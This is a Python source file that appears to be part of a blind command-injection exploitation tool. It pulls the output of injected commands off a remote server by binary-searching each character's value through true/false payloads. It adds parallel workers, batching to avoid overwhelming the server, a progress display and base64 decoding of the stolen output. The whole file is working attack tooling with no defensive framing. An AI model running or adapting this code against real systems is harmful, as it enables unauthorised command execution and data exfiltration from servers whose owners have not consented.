import base64
import time
import concurrent.futures
import os
from rich.console import Console
from rich.progress import Progress, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn

console = Console()

def find_output_length(cmd, strategy, max_retries=3):
    """Binary search to find the length of the output"""
    initial_right = 1000
    max_attempts = 3  # Maximum number of bound increases
    right = initial_right
    
    for attempt in range(max_attempts):
        left = 0 if attempt == 0 else initial_right * (10 ** (attempt - 1))
        right = initial_right * (10 ** attempt)
        retry_count = 0
        
        while left <= right and retry_count < max_retries:
            mid = (left + right) // 2
            # Check if length is >= mid
            test_cmd = strategy.create_length_check_payload(cmd, mid)
            result = strategy.send_payload(test_cmd)
            
            if result is None:  # Handle connection errors
                retry_count += 1
                time.sleep(0.5)
                continue
                
            retry_count = 0  # Reset retry counter on successful request
            
            if result:  # Length is >= mid
                left = mid + 1
            else:
                right = mid - 1
        
        # If we didn't hit the upper bound, we found the actual length
        if left <= initial_right * (10 ** attempt):
            return right
            
        console.print(f"[yellow]Output length exceeds {right}, trying larger bounds...[/]")
    
    console.print(f"[bold red]Warning: Could not determine exact length even with bound {right}[/]")
    return right  # Return the last attempted bound

def binary_search_character(task):
    """Perform binary search to find the character at a specific position"""
    position, cmd, strategy, timeout = task
    left, right = 43, 122  # ASCII range for base64 characters
    
    while left <= right:
        mid = (left + right) // 2
        
        # Check if character is equal to mid
        payload = strategy.create_char_check_payload(cmd, position, mid)
        is_equal = strategy.send_payload(payload, timeout)
        
        if is_equal:
            return chr(mid)
        
        # Check if character is less than mid
        payload = strategy.create_char_less_than_payload(cmd, position, mid)
        is_less = strategy.send_payload(payload, timeout)
        
        if is_less:
            right = mid - 1
        else:
            left = mid + 1
    
    return None  # Character not found

def read_output_parallel(cmd, strategy, max_workers=10, timeout=5, batch_size=None, debug_mode=False):
    """Extract output using parallel binary search"""
    # First determine the length of the output
    length = find_output_length(cmd, strategy)
    console.print(f"[bold cyan]Output length:[/] [yellow]{length}[/] characters")
    if length <= 0:
        console.print("[bold red]Could not determine output length, aborting[/]")
        return ""
    
    # Check if running in Cursor/Electron environment
    in_electron = 'ELECTRON_RUN_AS_NODE' in os.environ
    executor_class = concurrent.futures.ThreadPoolExecutor if in_electron else concurrent.futures.ProcessPoolExecutor
    
    result = [""] * length
    remaining_positions = list(range(length))
    
    # If batch_size is not specified, calculate based on workers
    if batch_size is None:
        batch_size = max_workers * 4
    
    # Create a progress display
    with Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(complete_style="green", finished_style="bright_green"),
        TaskProgressColumn(),
        TimeRemainingColumn(),
        TextColumn("[cyan]{task.fields[current]}[/]"),
        console=console
    ) as progress:
        task = progress.add_task("[bold]Reading output", total=length, current="")
        
        # Process in batches to avoid overwhelming the server
        while remaining_positions:
            current_batch = remaining_positions[:batch_size]
            position_tasks = []
            
            # Prepare all binary search tasks for this batch
            for position in current_batch:
                position_tasks.append((position, cmd, strategy, timeout))
            
            if debug_mode:
                # In debug mode, process one by one
                for task_data in position_tasks:
                    position = task_data[0]
                    try:
                        console.print(f"[bold cyan]DEBUG:[/] Processing position {position}")
                        char = binary_search_character(task_data)
                        if char:
                            result[position] = char
                            remaining_positions.remove(position)
                            
                            # Update progress
                            partial = ''.join(c if c else '?' for c in result)
                            progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                            console.print(f"[bold cyan]DEBUG:[/] Position {position} = '{char}'")
                    except Exception as e:
                        console.print(f"[bold red]Error processing position {position}:[/] {str(e)}")
            else:
                # Use the appropriate executor based on environment
                with executor_class(max_workers=max_workers) as executor:
                    futures = {executor.submit(binary_search_character, task): task[0] for task in position_tasks}
                    
                    for future in concurrent.futures.as_completed(futures):
                        position = futures[future]
                        try:
                            char = future.result()
                            if char:
                                result[position] = char
                                remaining_positions.remove(position)
                                
                                # Update progress
                                partial = ''.join(c if c else '?' for c in result)
                                progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                        except Exception as e:
                            console.print(f"[bold red]Error processing position {position}:[/] {str(e)}")
    
    # Join all characters and decode
    base64_result = ''.join(result)
    console.print("\n[bold green]Final base64:[/]", base64_result)
    
    # Try to decode the base64 result
    try:
        decoded_result = base64.b64decode(base64_result).decode('utf-8')
        return decoded_result
    except Exception as e:
        console.print(f"[bold red]Error decoding base64:[/] {str(e)}")
        return base64_result